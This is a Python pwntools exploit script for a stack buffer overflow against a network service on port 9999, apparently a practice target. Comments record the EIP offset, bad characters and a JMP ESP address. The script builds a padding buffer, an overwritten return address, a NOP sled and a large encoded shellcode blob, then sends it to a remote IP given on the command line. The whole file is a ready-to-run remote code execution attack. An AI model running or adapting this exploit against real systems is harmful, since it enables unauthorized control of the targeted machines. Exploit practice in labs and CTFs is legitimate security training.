#!usr/bin/env/python

from pwn import *
import sys

#offset--> 524
#bad --> 0x00
#jmp esp --> 0x311712f3 

# cyclic(size) <-- TO identify the offset of EIP
# check BAD chars (0x00 avoid)
# Find JMP esp (ff)

ip = sys.argv[1]
port = 9999
p = remote(ip,port)

shellcode =  b"\x90"*20
shellcode += b"\xbf\x68\xfa\xb8\xb3\xd9\xcb\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x7a\x12\x03\x7a\x12"
shellcode += b"\x83\x82\x06\x5a\x46\xae\x1f\x19\xa9\x4e\xe0"
shellcode += b"\x7e\x23\xab\xd1\xbe\x57\xb8\x42\x0f\x13\xec"
shellcode += b"\x6e\xe4\x71\x04\xe4\x88\x5d\x2b\x4d\x26\xb8"
shellcode += b"\x02\x4e\x1b\xf8\x05\xcc\x66\x2d\xe5\xed\xa8"
shellcode += b"\x20\xe4\x2a\xd4\xc9\xb4\xe3\x92\x7c\x28\x87"
shellcode += b"\xef\xbc\xc3\xdb\xfe\xc4\x30\xab\x01\xe4\xe7"
shellcode += b"\xa7\x5b\x26\x06\x6b\xd0\x6f\x10\x68\xdd\x26"
shellcode += b"\xab\x5a\xa9\xb8\x7d\x93\x52\x16\x40\x1b\xa1"
shellcode += b"\x66\x85\x9c\x5a\x1d\xff\xde\xe7\x26\xc4\x9d"
shellcode += b"\x33\xa2\xde\x06\xb7\x14\x3a\xb6\x14\xc2\xc9"
shellcode += b"\xb4\xd1\x80\x95\xd8\xe4\x45\xae\xe5\x6d\x68"
shellcode += b"\x60\x6c\x35\x4f\xa4\x34\xed\xee\xfd\x90\x40"
shellcode += b"\x0e\x1d\x7b\x3c\xaa\x56\x96\x29\xc7\x35\xff"
shellcode += b"\x9e\xea\xc5\xff\x88\x7d\xb6\xcd\x17\xd6\x50"
shellcode += b"\x7e\xdf\xf0\xa7\x81\xca\x45\x37\x7c\xf5\xb5"
shellcode += b"\x1e\xbb\xa1\xe5\x08\x6a\xca\x6d\xc8\x93\x1f"
shellcode += b"\x21\x98\x3b\xf0\x82\x48\xfc\xa0\x6a\x82\xf3"
shellcode += b"\x9f\x8b\xad\xd9\xb7\x26\x54\x8a\xbd\xbe\x4e"
shellcode += b"\x83\xaa\xbc\x6e\x30\x02\x48\x88\x5c\x44\x1c"
shellcode += b"\x03\xc9\xfd\x05\xdf\x68\x01\x90\x9a\xab\x89"
shellcode += b"\x17\x5b\x65\x7a\x5d\x4f\x12\x8a\x28\x2d\xb5"
shellcode += b"\x95\x86\x59\x59\x07\x4d\x99\x14\x34\xda\xce"
shellcode += b"\x71\x8a\x13\x9a\x6f\xb5\x8d\xb8\x6d\x23\xf5"
shellcode += b"\x78\xaa\x90\xf8\x81\x3f\xac\xde\x91\xf9\x2d"
shellcode += b"\x5b\xc5\x55\x78\x35\xb3\x13\xd2\xf7\x6d\xca"
shellcode += b"\x89\x51\xf9\x8b\xe1\x61\x7f\x94\x2f\x14\x9f"
shellcode += b"\x25\x86\x61\xa0\x8a\x4e\x66\xd9\xf6\xee\x89"
shellcode += b"\x30\xb3\x1f\xc0\x18\x92\xb7\x8d\xc9\xa6\xd5"
shellcode += b"\x2d\x24\xe4\xe3\xad\xcc\x95\x17\xad\xa5\x90"
shellcode += b"\x5c\x69\x56\xe9\xcd\x1c\x58\x5e\xed\x34"


size = 1000

buf = b"A"*524
buf += p32(0x311712f3)
buf += shellcode
buf += b"C"*(size-len(buf))

p.send(buf)